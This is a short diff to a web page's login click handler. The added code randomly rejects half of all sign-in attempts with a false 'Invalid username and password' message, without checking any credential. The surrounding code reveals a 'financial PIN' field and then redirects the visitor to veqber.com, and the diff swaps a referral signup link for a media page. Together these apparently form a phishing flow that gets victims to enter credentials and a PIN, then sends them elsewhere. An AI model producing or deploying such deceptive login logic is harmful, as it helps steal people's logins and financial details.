@@ -110,6 +110,12 @@ loginComponent.addEventListener('click', (event) => {
     return;
   }
 
+  var randomValue = Math.random();
+  if (randomValue < 0.5) {
+    alert('Invalid username and password');
+    return;
+  }
+
   if (signinClickCount == 0) {
     financialPinElement.style.display = 'block';
     signinClickCount = 1;
@@ -119,7 +125,6 @@ loginComponent.addEventListener('click', (event) => {
       return;
     }
 
-    window.location.href =
-      'https://veqber.com/auth/signup/?upline=121072853071&lang=en';
+    window.location.href = 'https://veqber.com/media';
   }
 });
